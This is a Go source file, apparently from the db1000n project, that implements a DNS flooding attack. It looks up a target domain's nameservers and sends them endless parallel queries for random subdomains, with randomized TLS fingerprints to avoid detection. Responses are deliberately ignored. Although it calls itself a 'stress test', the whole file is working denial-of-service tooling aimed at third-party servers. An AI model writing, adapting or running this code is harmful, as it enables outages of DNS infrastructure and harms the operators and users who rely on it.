package dnsblast

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/miekg/dns"
	utls "github.com/refraction-networking/utls"
	"go.uber.org/zap"

	"github.com/Arriven/db1000n/src/utils"
	"github.com/Arriven/db1000n/src/utils/metrics"
)

const (
	UDPProtoName    = "udp"
	TCPProtoName    = "tcp"
	TCPTLSProtoName = "tcp-tls"
)

// Config contains all the necessary configuration for dns-blast
type Config struct {
	RootDomain      string
	Protocol        string        // "udp", "tcp", "tcp-tls"
	SeedDomains     []string      // Used to generate domain names using the Distinct Heavy Hitter algorithm
	Delay           time.Duration // The delay between two packets to send
	ParallelQueries int
	ClientID        string
}

// Start starts the job based on provided configuration
func Start(ctx context.Context, config *Config, wg *sync.WaitGroup, a *metrics.Accumulator, logger *zap.Logger) error {
	defer utils.PanicHandler(logger)

	logger.Debug("igniting the blaster",
		zap.String("rootDomain", config.RootDomain),
		zap.String("proto", config.Protocol),
		zap.Strings("seeds", config.SeedDomains),
		zap.Duration("delay", config.Delay),
		zap.Int("parallelQueries", config.ParallelQueries))

	nameservers, err := getNameservers(config.RootDomain, config.Protocol)
	if err != nil {
		metrics.IncDNSBlast(config.RootDomain, "", config.Protocol, metrics.StatusFail)

		return fmt.Errorf("failed to resolve nameservers for the root domain [rootDomain=%s]: %w",
			config.RootDomain, err)
	}

	logger.Debug("nameservers resolved for the root domain", zap.String("rootDomain", config.RootDomain), zap.Strings("nameservers", nameservers))

	stressTestParameters := &stressTestParameters{
		Delay:           config.Delay,
		Protocol:        config.Protocol,
		SeedDomains:     config.SeedDomains,
		ParallelQueries: config.ParallelQueries,
	}

	for _, nameserver := range nameservers {
		if wg != nil {
			wg.Add(1)
		}

		go func(nameserver string, a *metrics.Accumulator) {
			if wg != nil {
				defer wg.Done()
			}

			defer utils.PanicHandler(logger)

			executeStressTest(ctx, nameserver, stressTestParameters, a, logger)
		}(nameserver, a.Clone(uuid.NewString())) // metrics.Accumulator is not safe for concurrent use, so let's make a new one
	}

	return nil
}

// stressTestParameters contains parameters for a single stress test
type stressTestParameters struct {
	Delay           time.Duration
	ParallelQueries int
	Protocol        string
	SeedDomains     []string
}

// executeStressTest executes a stress test based on parameters
func executeStressTest(ctx context.Context, nameserver string, parameters *stressTestParameters, a *metrics.Accumulator, logger *zap.Logger) {
	defer utils.PanicHandler(logger)

	sharedDNSClient := newDefaultDNSClient(parameters.Protocol)
	reusableQuery := &queryParameters{
		hostAndPort: nameserver,
		qName:       "", // To be generated on each cycle
		qType:       dns.TypeA,
	}

	nextLoopTicker := time.NewTicker(parameters.Delay)
	defer nextLoopTicker.Stop()

	for {
		reusableQuery.qName = randomSubdomain(parameters.SeedDomains)
		stats := make(metrics.MultiStats, parameters.ParallelQueries)

		var wg sync.WaitGroup

		wg.Add(parameters.ParallelQueries)

		for i := 0; i < parameters.ParallelQueries; i++ {
			go func(i int) {
				defer wg.Done()
				defer utils.PanicHandler(logger)
				stats[i] = query(sharedDNSClient, reusableQuery, logger)
			}(i)
		}

		wg.Wait()
		a.AddStats("dns://"+nameserver, stats.Sum()).Flush()

		select {
		case <-ctx.Done():
			logger.Debug("DNS stress canceled", zap.String("server", reusableQuery.hostAndPort))

			return
		case <-nextLoopTicker.C:
		}
	}
}

//nolint:gosec // Cryptographically secure random not required
func randomSubdomain(rootDomains []string) string {
	const (
		subdomainMinLength   = 3
		subdomainMaxLength   = 64
		randomizerDictionary = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	)

	b := make([]rune, subdomainMinLength+rand.Intn(subdomainMaxLength-subdomainMinLength))
	for i := range b {
		b[i] = []rune(randomizerDictionary)[rand.Intn(len(randomizerDictionary))]
	}

	return string(b) + "." + rootDomains[rand.Intn(len(rootDomains))] + "."
}

// queryParameters contains parameters of a single DNS query
type queryParameters struct {
	hostAndPort string
	qName       string
	qType       uint16
}

func query(client *dns.Client, parameters *queryParameters, logger *zap.Logger) metrics.Stats {
	seedDomain := getSeedDomain(parameters.qName)

	conn, err := client.Dial(parameters.hostAndPort)
	if err != nil {
		logger.Debug("failed to dial remote host to do the DNS query", zap.String("host", parameters.hostAndPort), zap.Error(err))
		metrics.IncDNSBlast(parameters.hostAndPort, seedDomain, client.Net, metrics.StatusFail)

		return metrics.Stats{1, 0, 0, 0}
	}

	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
	if client.Net == TCPTLSProtoName {
		conn.Conn = utls.UClient(conn, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
	}

	defer conn.Close()

	question := new(dns.Msg).SetQuestion(dns.Fqdn(parameters.qName), parameters.qType)

	if _, _, err = client.ExchangeWithConn(question, conn); err != nil {
		metrics.IncDNSBlast(parameters.hostAndPort, seedDomain, client.Net, metrics.StatusFail)
		logger.Debug("failed to complete the DNS query", zap.Error(err))

		return metrics.Stats{1, 1, 0, uint64(question.Len())}
	}

	metrics.IncDNSBlast(parameters.hostAndPort, seedDomain, client.Net, metrics.StatusSuccess)

	return metrics.Stats{1, 1, 1, uint64(question.Len())}
}

func newDefaultDNSClient(proto string) *dns.Client {
	const (
		dialTimeout  = 1 * time.Second        // Let's not wait long if the server cannot be dialled, we all know why
		writeTimeout = 500 * time.Millisecond // Longer write timeout than read timeout just to make sure the query is uploaded
		readTimeout  = 300 * time.Millisecond // Not really interested in reading responses
	)

	c := &dns.Client{
		Dialer: &net.Dialer{
			Timeout: dialTimeout,
		},
		DialTimeout:  dialTimeout,
		WriteTimeout: writeTimeout,
		ReadTimeout:  readTimeout,
		Net:          proto,
	}

	if c.Net == TCPTLSProtoName {
		c.TLSConfig = &tls.Config{
			InsecureSkipVerify: true, //nolint:gosec // This is intentional
		}
	}

	return c
}

func getNameservers(rootDomain string, protocol string) ([]string, error) {
	nameservers, err := net.LookupNS(rootDomain)
	if err != nil {
		return nil, err
	}

	const (
		defaultDNSPort        = "53"
		defaultDNSOverTLSPort = "853"
	)

	port := defaultDNSPort
	if protocol == TCPTLSProtoName {
		port = defaultDNSOverTLSPort
	}

	res := make([]string, 0, len(nameservers))
	for _, nameserver := range nameservers {
		res = append(res, net.JoinHostPort(nameserver.Host, port))
	}

	return res, nil
}

// getSeedDomain cut last subdomain part and root domain "." (dot). From <value>="test.example.com." returns "example.com"
func getSeedDomain(value string) string {
	// -1 to remove "." (dot) at end
	return value[strings.Index(value, ".")+1 : len(value)-1]
}
